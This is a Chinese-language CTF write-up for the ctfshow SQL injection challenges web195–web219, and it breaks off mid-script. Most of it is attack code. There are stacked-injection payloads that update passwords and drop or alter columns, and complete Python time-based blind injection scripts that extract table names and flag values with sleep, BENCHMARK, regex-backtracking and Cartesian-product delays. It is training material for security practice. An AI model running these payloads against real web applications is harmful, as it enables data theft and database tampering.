<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>限制了字符长度为16，还是可以堆叠注入，<code>select(1)</code>回显肯定会1，如果注入的话，那服务器查到的密码也为1，那么我们就可以拿到flag了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">select</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="web197–web200"><a href="#web197–web200" class="headerlink" title="web197–web200"></a>web197–web200</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>

<p>原理一样的，密码就是表名，表名已知</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user <span class="keyword">drop</span> pass;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user <span class="keyword">add</span> pass <span class="type">int</span> <span class="keyword">default</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>;<span class="keyword">insert</span> ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>如果修改数据的话，确实是会报密码错误，但是还是成功修改了</p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>参数根本拿不到，也没说，问了一下群友，知道一个工具拿来用用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install arjun</span><br><span class="line"></span><br><span class="line">arjun -u http://53f33753-1c7d-4c6b-94e9-8a52d19c9b97.challenge.ctf.show/api -m POST</span><br></pre></td></tr></table></figure>

<p>搞不出来，F12找到<code>select.js</code>才知道参数，写个脚本，然后卡了一个小时，发现我今天Windows有点问题，这个账我要算到PYCC头上，傻逼比赛，后面发现是我代理问题，延迟高了也影响了，确实满足时间盲注的特点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://58298b04-11de-449f-b7a0-aab7810ed179.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt;tail:</span><br><span class="line">        mid=(head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;if((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagx,ctfshow_info</span></span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id,flaga</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        last_time=time.time()-start_time</span><br><span class="line">        <span class="keyword">if</span> last_time&gt;right_time:</span><br><span class="line">            tail=mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        target+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>还是先传参<code>ip=1&amp;debug=1</code>看到查询语句，想办法给闭合了，写出脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://653a1b2b-6829-4f6b-bc54-83e0ba08d177.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt;tail:</span><br><span class="line">        mid=(head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;-1&#x27; or if((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;-1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagxc</span></span><br><span class="line">        <span class="comment"># payload = &quot;-1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id,flagaa</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        last_time=time.time()-start_time</span><br><span class="line">        <span class="keyword">if</span> last_time&gt;right_time:</span><br><span class="line">            tail=mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        target+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>看到查询语句里面是有<code>from_base64</code>，编码一下，闭合，改改payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://013f68f0-6427-4155-9175-8e1a6229c223.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt;tail:</span><br><span class="line">        mid=(head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;&#x27;MQ==&#x27;) or if ((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27;MQ==&#x27;) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagxcc</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27;MQ==&#x27;) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id,flagaac</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;MQ==&#x27;) or if ((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;0&#125;,1)))&lt;&#123;1&#125;,sleep(5),0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        last_time=time.time()-start_time</span><br><span class="line">        <span class="keyword">if</span> last_time&gt;right_time:</span><br><span class="line">            tail=mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        target+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p><code>sleep</code>没了，用<code>benchmark</code>绕过一下就好了<code>BENCHMARK(25000000, SHA2(&#39;test&#39;, 512))</code>这样子差不多就是5s</p>
<p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250501-175743.jpg" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c1d1ee9a-2ee5-427a-ae6b-6b8ffd4fd40f.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt;tail:</span><br><span class="line">        mid=(head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;1) or if ((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,BENCHMARK(25000000, SHA2(&#x27;test&#x27;, 512)),0)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,BENCHMARK(25000000, SHA2(&#x27;test&#x27;, 512)),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagxccb</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,BENCHMARK(25000000, SHA2(&#x27;test&#x27;, 512)),0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id,flagaabc</span></span><br><span class="line">        payload = <span class="string">&quot;1) or if ((ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;0&#125;,1)))&lt;&#123;1&#125;,BENCHMARK(25000000, SHA2(&#x27;test&#x27;, 512)),0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        last_time=time.time()-start_time</span><br><span class="line">        <span class="keyword">if</span> last_time&gt;right_time:</span><br><span class="line">            tail=mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        target+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<p>但是这东西明显慢很多了</p>
<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p><code>benchmark</code>没了，这里使用正则回溯达到延时(这么S?)</p>
<p><code>RPAD(1, 999999, &#39;a&#39;)</code> 会创建一个包含1个”1”和999998个”a”的字符串，<code>concat</code>连接巨大字符串，并且正则表达式是贪婪的，所以回溯就会很久</p>
<p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250501-185152.jpg" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cb28e2bd-e328-4c20-bbe7-274d23befca5.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">0.8</span></span><br><span class="line">sleep=<span class="string">&quot;(concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt;tail:</span><br><span class="line">        mid=(head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;1) or if ((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(i,mid,sleep)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid,sleep)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagxc</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid,sleep)</span></span><br><span class="line">        <span class="comment"># id,flagaac</span></span><br><span class="line">        payload = <span class="string">&quot;1) or if ((ascii(substr((select flagaac from ctfshow_flagxc),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid,sleep)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        last_time=time.time()-start_time</span><br><span class="line">        <span class="keyword">if</span> last_time&gt;right_time:</span><br><span class="line">            tail=mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        target+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<p>虽然延时不长，但是可以看出结果并没有错误</p>
<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>笛卡尔积，当表没有指定连接条件(<code>join</code>)时，数据库会执行笛卡尔积操作，笛卡尔积的结果行数 &#x3D; 每个表的行数相乘</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I);</span><br></pre></td></tr></table></figure>

<p>本地尝试效果不是特别好，因为我数据库比较小</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7cafa34f-18aa-4753-b381-e634e88e709c.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">0.8</span></span><br><span class="line">sleep=<span class="string">&quot;(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt;tail:</span><br><span class="line">        mid=(head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;1) or if ((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(i,mid,sleep)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid,sleep)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagxca</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid,sleep)</span></span><br><span class="line">        <span class="comment"># id,flagaabc</span></span><br><span class="line">        payload = <span class="string">&quot;1) or if ((ascii(substr((select flagaabc from ctfshow_flagxca),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid,sleep)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 